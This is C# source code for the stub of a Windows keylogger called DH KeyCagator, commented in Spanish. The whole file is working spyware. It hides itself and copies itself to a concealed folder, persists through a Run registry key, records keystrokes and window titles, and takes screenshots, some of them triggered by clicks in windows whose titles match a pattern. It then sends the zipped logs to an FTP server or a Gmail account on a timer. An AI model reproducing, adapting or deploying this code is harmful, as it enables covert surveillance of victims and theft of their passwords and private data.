// DH KeyCagator 1.6
// (C) Doddy Hackman 2015

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing.Imaging;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Net.Mail;
using Microsoft.Win32;
using Ionic.Zip;

namespace stub
{
    public partial class Form1 : Form
    {

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr ventana, StringBuilder cadena, int cantidad);

        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 tam;
            public Int32 bandera;
            public IntPtr dondetoy;
            public POINTAPI posnow;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int posicionx;
            public int posiciony;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO punteronow);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr lala, int voyx, int voyy, IntPtr icononow);

        // Variables importantes del STUB

        string keylogger_online = "";

        string op_directorio_especial = "";
        string directorio = "";
        string nombre_carpeta = "";
        string rutadondeestoy;

        string screenshots_por_tiempo = "";
        string screenshots_por_tiempo_segundos = "";

        string screenshots_por_click = "";
        string screenshots_por_click_texto = "";

        string ftp_opcion = "";
        string ftp_opcion_segundos = "";
        string ftp_server = "";
        string ftp_username = "";
        string ftp_password = "";
        string ftp_directorio = "";

        string gmail_sender_op = "";
        string gmail_sender_op_segundos = "";
        string gmail_username = "";
        string gmail_password = "";
        string you_email = "";
        string gmail_only_logs_sender = "";

        // Fin de variables importantes del STUB

        // Variables importantes el keylogger

        string nombre_ventana1 = "";
        string nombre_ventana2 = "";

        string directorio_final = "";

        string ruta_keylogger_inicial = "";
        string ruta_keylogger_final = "";

        public Form1()
        {
            InitializeComponent();

            this.WindowState = FormWindowState.Minimized;
            //this.ShowInTaskbar = false;
            this.Visible = false;

            // Configurar variables con el STUB

            load_config config = new load_config();
            config.load_data();
            //MessageBox.Show(config.get_data());

            keylogger_online = config.keylogger_online;

            op_directorio_especial = config.opcion_directorio_especial;
            directorio = config.directorio_normal;
            nombre_carpeta = config.carpeta;

            screenshots_por_tiempo = config.opcion_capturar_pantalla_normal;

            if (config.tiempo_capture_pantalla_normal != "")
            {
                screenshots_por_tiempo_segundos = Convert.ToString(Convert.ToInt16(config.tiempo_capture_pantalla_normal) * 1000); //
            }

            screenshots_por_click = config.opcion_capturar_pantalla_especial;
            screenshots_por_click_texto = config.regex_for_windows;

            ftp_opcion = config.opcion_ftp_sender;
            if (config.tiempo_ftp_sender != "")
            {
                ftp_opcion_segundos = Convert.ToString(Convert.ToInt16(config.tiempo_ftp_sender) * 1000); //
            }
            ftp_server = config.ftp_host;
            ftp_username = config.ftp_user;
            ftp_password = config.ftp_pass;
            ftp_directorio = config.ftp_path;

            gmail_sender_op = config.opcion_sender_mail;
            if (config.tiempo_sender_mail != "")
            {
                gmail_sender_op_segundos = Convert.ToString(Convert.ToInt16(config.tiempo_sender_mail) * 1000); //
            }
            gmail_username = config.mail_user;
            gmail_password = config.mail_pass;
            you_email = config.mail_to;
            gmail_only_logs_sender = config.opcion_sender_mail_only;

            // 

            // Configurar variables del programa

            if (config.opcion_directorio_especial == "0")
            {
                directorio_final = directorio + nombre_carpeta + "/";
            }
            else
            {
                directorio_final = Environment.GetEnvironmentVariable(directorio) + nombre_carpeta + "/";
            }

            ruta_keylogger_inicial = Application.ExecutablePath;

            rutadondeestoy = System.Reflection.Assembly.GetEntryAssembly().Location;
            string nombredondestoy = Path.GetFileName(rutadondeestoy);

            ruta_keylogger_final = directorio_final + nombredondestoy;

            //

        }

        // Functions 

        public void savefile(string file, string texto)
        {

            //richTextBox1.AppendText(texto);

            try
            {
                System.IO.StreamWriter save = new System.IO.StreamWriter(file, true);
                save.Write(texto);
                save.Close();
            }
            catch
            {
                //
            }

        }

        public string basename(string file)
        {
            String nombre = "";

            FileInfo basename = new FileInfo(file);
            nombre = basename.Name;

            return nombre;

        }

        public void FTP_Upload(string servidor, string usuario, string password, string directorio_ftp, string archivo)
        {
            // Based on : http://madskristensen.net/post/simple-ftp-file-upload-in-c-20

            try
            {
                WebClient ftp = new System.Net.WebClient();
                ftp.Credentials = new System.Net.NetworkCredential(usuario, password);

                FileInfo dividir = new FileInfo(archivo);
                string solo_nombre = dividir.Name;

                ftp.UploadFile("ftp://" + servidor + "/" + directorio_ftp + "/" + solo_nombre, "STOR", archivo);
            }
            catch
            {
                //
            }
        }

        public void Gmail_Send()
        {

            // Based on : http://www.codeproject.com/Tips/160326/Using-Gmail-Account-to-Send-Emails-With-Attachment

            try
            {

                MailAddress de = new MailAddress(gmail_username);
                MailAddress a = new MailAddress(you_email);

                MailMessage mensaje = new MailMessage(de, a);

                mensaje.Subject = "LOGS";
                mensaje.Body = "Enjoy the logs";

                if (gmail_only_logs_sender == "1")
                {
                    Attachment archivo = new Attachment(directorio_final + "logs.html");
                    archivo.Name = "logs.html";
                    mensaje.Attachments.Add(archivo);
                }
                else
                {
                    recoger_logs();
                    Attachment archivo = new Attachment(directorio_final + "logs.zip");
                    archivo.Name = basename("logs.zip");
                    mensaje.Attachments.Add(archivo);
                }

                SmtpClient gmailsender = new SmtpClient("smtp.gmail.com", 587);

                gmailsender.UseDefaultCredentials = false;
                gmailsender.EnableSsl = true;
                gmailsender.Credentials = new NetworkCredential(gmail_username, gmail_password);

                gmailsender.Send(mensaje);

            }

            catch
            {
                //
            }

        }

        public string gen_random()
        {
            string gen = "";
            Random random_now = new System.Random();
            gen = Convert.ToString(random_now.Next(111111, 999999));
            return gen;
        }

        public void screenshot(string nombre)
        {

            // Based on : http://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
            // Thanks to Dimitar

            try
            {

                const Int32 mostraelmouse = 0x00000001;

                Bitmap screenshot_file = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format24bppRgb);
                Graphics grafico = Graphics.FromImage(screenshot_file);

                grafico.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

                CURSORINFO cursornow;

                cursornow.tam = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));

                if (GetCursorInfo(out cursornow))
                {
                    if (cursornow.bandera == mostraelmouse)
                    {
                        DrawIcon(grafico.GetHdc(), cursornow.posnow.posicionx, cursornow.posnow.posiciony, cursornow.dondetoy);
                        grafico.ReleaseHdc();
                    }
                }

                screenshot_file.Save(nombre);

                File.SetAttributes(directorio_final + nombre, FileAttributes.Hidden);
            }
            catch
            {
                //
            }
        }

        public void recoger_logs()
        {

            if (File.Exists(directorio_final + "logs.zip"))
            {
                File.Delete(directorio_final + "logs.zip");
            }

            ZipFile zip = new ZipFile();

            if (File.Exists(directorio_final + "logs.html"))
            {
                zip.AddFile(directorio_final + "logs.html");
            }

            DirectoryInfo cargando_directorio = new DirectoryInfo(directorio_final);
            foreach (FileInfo archivo in cargando_directorio.GetFiles())
            {
                if (Path.GetExtension(archivo.Name) == ".jpg")
                {
                    zip.AddFile(directorio_final + archivo.Name);
                }
            }

            zip.Save("logs.zip");

            File.SetAttributes(directorio_final + "logs.zip", FileAttributes.Hidden);
        }

        public void enviar_logs_ftp(string host, string username, string password, string directorio)
        {
            recoger_logs();
            FTP_Upload(ftp_server, ftp_username, ftp_password, ftp_directorio, directorio_final + "logs.zip");
        }

        //


        private void Form1_Load(object sender, EventArgs e)
        {

            this.Hide();

            if (keylogger_online == "1")
            {
                try
                {

                    if (!Directory.Exists(directorio_final))
                    {
                        Directory.CreateDirectory(directorio_final);
                        File.SetAttributes(directorio_final, FileAttributes.Hidden);
                    }
                    else
                    {
                        File.SetAttributes(directorio_final, FileAttributes.Hidden);
                    }

                    Directory.SetCurrentDirectory(directorio_final);

                    if (!File.Exists(directorio_final + "logs.html"))
                    {
                        savefile("logs.html", "<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>");
                        File.SetAttributes(directorio_final + "logs.html", FileAttributes.Hidden);
                    }
                    
                    try
                    {
                        File.Copy(ruta_keylogger_inicial, ruta_keylogger_final);
                        File.SetAttributes(ruta_keylogger_final, FileAttributes.Hidden);
                    }
                    catch
                    {
                        //
                    }

                    try
                    {
                        File.Copy(Path.GetDirectoryName(rutadondeestoy) + "/Ionic.Zip.dll", directorio_final + "/Ionic.Zip.dll");
                        File.SetAttributes(directorio_final + "/Ionic.Zip.dll", FileAttributes.Hidden);
                    }
                    catch
                    {
                        //
                    }

                    capturar_teclas.Enabled = true;
                    capturar_ventanas.Enabled = true;
                    panelcontrol.Enabled = true;

                    if (screenshots_por_tiempo != "0")
                    {
                        capturar_pantalla.Interval = Convert.ToInt32(screenshots_por_tiempo_segundos);
                        capturar_pantalla.Enabled = true;
                    }


                    if (ftp_opcion != "0")
                    {
                        enviar_logs_by_ftp.Interval = Convert.ToInt32(ftp_opcion_segundos);
                        enviar_logs_by_ftp.Enabled = true;
                    }

                    if (gmail_sender_op != "0")
                    {
                        enviar_logs_by_mail.Interval = Convert.ToInt32(gmail_sender_op_segundos);
                        enviar_logs_by_mail.Enabled = true;
                    }
                }

                catch
                {
                    //
                }

                try
                {

                    RegistryKey loadnow = Registry.LocalMachine;
                    loadnow = loadnow.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    loadnow.SetValue("uberk", ruta_keylogger_final, RegistryValueKind.String);
                    loadnow.Close();

                }

                catch
                {
                    //
                }

                //MessageBox.Show("Keylogger Online");
               
            }
            else
            {
                MessageBox.Show("Keylogger Offline");
                Application.Exit();
            }


        }

        private void capturar_teclas_Tick(object sender, EventArgs e)
        {
            // Keylogger Based on http://www.blackstuff.net/f44/c-keylogger-4848/
            // Thanks to Carlos Raposo 

            List<string> teclas_izquierdas_numero = new List<string> { "96", "97", "98", "99", "100", "101", "102", "103", "104", "105" };
            List<string> teclas_izquierdas_valor = new List<string> { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };

            for (int numcontrolnumizquierda = 0; numcontrolnumizquierda < teclas_izquierdas_numero.Count; numcontrolnumizquierda++)
            {
                int numeros_izquierda_control = GetAsyncKeyState(Convert.ToInt16(teclas_izquierdas_numero[numcontrolnumizquierda]));
                if (numeros_izquierda_control == -32767)
                {
                    savefile("logs.html", teclas_izquierdas_valor[numcontrolnumizquierda]);
                    //richTextBox1.AppendText(teclas_izquierdas_valor[numcontrolnumizquierda]);
                }
            }

            for (int num = 0; num <= 255; num++)
            {
                int numcontrol = GetAsyncKeyState(num);
                if (numcontrol == -32767)
                {

                    if (num >= 65 && num <= 122)
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)) && Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                        {
                            // si se detecta Shift y CapsLock ...
                            string letra = Convert.ToChar(num + 32).ToString();
                            savefile("logs.html", letra);
                            //richTextBox1.AppendText(letra); 
                        }
                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                        {
                            // si se detecta Shift o CapsLock
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.html", letra);
                            //richTextBox1.AppendText(letra);
                        }
                        else if (Convert.ToBoolean(GetKeyState(Keys.CapsLock)))
                        {
                            // si se detecta CapsLock ...
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.html", letra);
                            //richTextBox1.AppendText(letra); 

                        }
                        else
                        {
                            // si no se detecta ni Shift ni CapsLock ... 
                            string letra = Convert.ToChar(num + 32).ToString();
                            savefile("logs.html", letra);
                            //richTextBox1.AppendText(letra); 
                        }
                    }
                    else if (num >= 48 && num <= 57) // si el int num esta entre 48 y 57 ...
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey))) // si se detecta Shift...
                        {
                            string letra = Convert.ToChar(num - 16).ToString();
                            savefile("logs.html", letra);
                            //richTextBox1.AppendText(letra); 
                        }
                        else // si no se detecta Shift ...
                        {
                            string letra = Convert.ToChar(num).ToString();
                            savefile("logs.html", letra);
                            //richTextBox1.AppendText(letra); 
                        }
                    }
                    else
                    {
                        string letra_rara = Enum.GetName(typeof(Keys), num);
                        savefile("logs.html", "[" + letra_rara + "]");
                        //richTextBox1.AppendText("["+letra_rara+"]");
                    }
                }
            }
        }

        private void capturar_ventanas_Tick(object sender, EventArgs e)
        {
            const int limite = 256;
            StringBuilder buffer = new StringBuilder(limite);
            IntPtr manager = GetForegroundWindow();

            if (GetWindowText(manager, buffer, limite) > 0)
            {
                nombre_ventana1 = buffer.ToString();

                if (screenshots_por_click != "0")
                {
                    Match regex = Regex.Match(nombre_ventana1, screenshots_por_click_texto, RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {

                        int numcontrol_click_pantalla = GetAsyncKeyState(1);
                        if (numcontrol_click_pantalla == -32767)
                        {
                            string nombrefinal2 = gen_random().Trim() + ".jpg";
                            string final2 = nombrefinal2.Replace(":", "_");
                            screenshot(final2);
                            savefile("logs.html", "\n" + "<br><br><center><img src=" + final2 + "></center><br><br>" + "\n");
                        }

                    }
                }

                if (nombre_ventana1 != nombre_ventana2)
                {
                    nombre_ventana2 = nombre_ventana1;
                    savefile("logs.html", "\n" + "<hr style=color:#00FF00><h2><center>" + nombre_ventana2 + "</h2></center><br>" + "\n");
                }
            }
        }

        private void capturar_pantalla_Tick(object sender, EventArgs e)
        {
            string fecha = DateTime.Now.ToString("h:mm:ss tt");
            string nombrefinal = fecha.Trim() + ".jpg";
            string final = nombrefinal.Replace(":", "_");
            screenshot(final);
            savefile("logs.html", "\n" + "<br><br><center><img src=" + final + "></center><br><br>" + "\n");
        }

        private void enviar_logs_by_ftp_Tick(object sender, EventArgs e)
        {
            enviar_logs_ftp(ftp_server, ftp_username, ftp_password, ftp_directorio);
        }

        private void enviar_logs_by_mail_Tick(object sender, EventArgs e)
        {
            Gmail_Send();
        }

        private void panelcontrol_Tick(object sender, EventArgs e)
        {
            if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
            {
                int numcontrol_click_pantalla = GetAsyncKeyState(120);
                if (numcontrol_click_pantalla == -32767)
                {
                    //richTextBox1.AppendText("yeah bitch\n");
                    Form2 form2 = new Form2();
                    form2.Show();
                }
            }

        }

    }
}

// The End ?